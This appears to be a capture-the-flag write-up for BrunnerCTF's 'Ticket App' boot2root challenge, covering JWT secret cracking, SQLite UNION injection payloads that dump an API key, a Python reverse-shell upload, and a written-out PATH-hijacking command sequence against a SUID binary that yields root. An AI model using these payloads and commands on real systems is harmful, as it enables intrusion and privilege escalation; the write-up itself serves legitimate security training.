# Ticket-APP-Boot2Root-Walkthrough-BrunnerCTF-

In this writeup, we’ll go through solving the **Ticket App** Boot2Root challenge from **BrunnerCTF**.  
The target is a web application, and we’ll exploit it step-by-step to gain user and root access.
![Image](images/Pasted%20image%2020250825085948.png)

## Enumeration
After accessing the website, I noticed two options: **Register** and **Login**.  
I created a new account and logged in successfully.
![Image](images/Pasted%20image%2020250825090317.png)


![Image](images/Pasted%20image%2020250825090343.png)

Once logged in, the dashboard displayed field Admin: False **(This strongly hinted at the use of a JWT (JSON Web Token) for authentication.)**

![Image](images/Pasted%20image%2020250825090404.png)

## Exploiting JWT Authentication
I took the token copy and go to [token.dev](https://token.dev/)
![Image](images/Pasted%20image%2020250825090442.png)

The token was **HS256-signed**. If the signing secret can be guessed or cracked, we can forge our own token.
![Image](images/Pasted%20image%2020250825090505.png)


I found that If I knew the secret I cand edit this token and make the admin true
I crafted this python script to brute force the secret. After a successful crack, It will modify admin from false to true
![Image](images/Pasted%20image%2020250825090849.png)

this file is also in the repo called jwt.py
after running the script I get a new token of admin priv.
![Image](images/Pasted%20image%2020250825090948.png)


After replacing my old token, the application recognized me as **Admin**. A new input field appeared on the interface.

![Image](images/Pasted%20image%2020250825091026.png)

## SQL Injection

I tried to search through this input

![Image](images/Pasted%20image%2020250825091059.png)
The new input box allowed queries, so I tested it with a single quote (`'`) → classic SQL injection behavior appeared.
![Image](images/Pasted%20image%2020250825091136.png)
![Image](images/Pasted%20image%2020250825092238.png)
Next, I fingerprinted the backend database:
- MySQL payload → failed
    
- SQL Server payload → failed
    
- SQLite payload → succeeded ✅

MySQL:

![Image](images/Pasted%20image%2020250825093046.png)
SQL Server:

![Image](images/Pasted%20image%2020250825093124.png)
SQLite:

![Image](images/Pasted%20image%2020250825093143.png)

## Database Enumeration
I tried this payload to get all tables name and I found a table called settings which is tempting

```sql
UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table'--
```

![Image](images/Pasted%20image%2020250825093220.png)
so I decided to get all table columns I found a column called key
![Image](images/Pasted%20image%2020250825093331.png)

```sql
' UNION SELECT 1, name, 3, 4 FROM pragma_table_info('settings')--
```

So I decided to select data in this table 
![Image](images/Pasted%20image%2020250825093412.png)

```sql
' UNION SELECT 1, key, value, 4 FROM settings--
```
and I found a API key 
![Image](images/Pasted%20image%2020250825093549.png)
I decided to open robots .txt to see if there is any directories we can use it and luckily I found /api/docs so I go to this directory

![Image](images/Pasted%20image%2020250825091619.png)
We found it is swagger API Documentation which is very useful to us there is a PUT API endpoint
![Image](images/Pasted%20image%2020250825091657.png)
First I authorize using my Token
![Image](images/Pasted%20image%2020250825091742.png)

![Image](images/Pasted%20image%2020250825093638.png)
in /api/module we see that we can upload file and the uploaded file will run in python so I decided to upload a python reverse shell 
![Image](images/Pasted%20image%2020250825093656.png)
First I open a listener
![Image](images/Pasted%20image%2020250825093749.png)
then a tunnel to make the listener public
![Image](images/Pasted%20image%2020250825093834.png)
I uploaded the reverse shell
![Image](images/Pasted%20image%2020250825094041.png)
after uploading it it doesn't run through swagger so I decided to use curl
![Image](images/Pasted%20image%2020250825094215.png)
I used curl to make some changes in request
## Initial Foothold (RCE)
![Image](images/Pasted%20image%2020250825094427.png)
and boom we have a shell

![Image](images/Pasted%20image%2020250825094442.png)
![Image](images/Pasted%20image%2020250825094523.png)
# Privilege Escalation
## Enumeration
I search for the SUID Binaries and I found a custom binary called syslog-manager
which I will use it to make privesc
![Image](images/Pasted%20image%2020250825094604.png)
FIrst I used -h to know the usage of this binary

![Image](images/Pasted%20image%2020250825094624.png)
I run strings to know all strings in the binary
```bash
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/$ strings /usr/bin/syslog-manager            
/lib64/ld-linux-x86-64.so.2
snprintf
__isoc23_strtoull
perror
free
fread
stat
setuid
fopen
system
localtime_r
strlen
strstr
stdout
getline
strftime
__libc_start_main
stderr
fprintf
__cxa_finalize
ftell
fclose
fwrite
strcmp
fseek
libc.so.6
GLIBC_2.33
GLIBC_2.38
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Usage:
  %s read   [max_bytes]
  %s tail   [lines]
  %s append <text>
  %s search <needle>
  %s clean
  %s stats
/var/log/syslog.log
open
fseek
ftell
cleaner %s 2>/dev/null
Command too long
Error: cleaning failed
stat
%Y-%m-%d %H:%M:%S %z
path : %s
size : %lld bytes
lines: %zu
mtime: %s
path : %s
size : %lld bytes
lines: %zu
mtime: %ld
read
tail
append
search
clean
stats
```
From strings we see
`cleaner %s 2>/dev/null`
this means that it runs a file called cleaner when we add the option `clean`

```bash
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ /usr/bin/syslog-manager clean              
Error: cleaning failed
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ cleaner
bash: cleaner: command not found
```

---
## Exploit
as we don't found the cleaner file so I decided to make this file 
and make it executable but before that I need to edit the Path of executable in our machine
so I run this command 
`ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ export PATH=/tmp:$PATH`
this command add the /tmp to the PATH
so I can run any thing inside it without provide it's directory 
then I make a clear file called cleaner to test if the clean option will be run or not
and change it's permission to 777 and the `/usr/bin/syslog-manager clean` doesn't print to us
`Error: cleaning failed`
so I add the bash header to the fil and make it run bash env
after this I was root
```bash
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ export PATH=/tmp:$PATH
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ echo '' > cleaner 
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ chmod 777 ./cleaner
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ /usr/bin/syslog-manager clean              
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ echo '#!/bin/bash' > cleaner                 
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ echo '/bin/bash -p' >> cleaner
ctfplayer@ctf-tickets-app-user-28dde2077d78fecf-57fdf98dbf-dnsk8:/tmp$ /usr/bin/syslog-manager clean                 
id
uid=0(root) gid=1000(ctfplayer) groups=1000(ctfplayer)          
```   

---
# Conclusion

This Boot2Root challenge followed a classic **Web → RCE → PrivEsc** flow:

1. Weak **JWT secret** allowed token forgery and privilege escalation to Admin.
    
2. SQL Injection exposed **API keys**.
    
3. Swagger API enabled **Python RCE** through file upload.
    
4. A custom **SUID binary** (`syslog-manager`) with unsafe `system()` call led to **root privilege escalation** via PATH hijacking.
    

🎯 **Flags captured, root access achieved.**
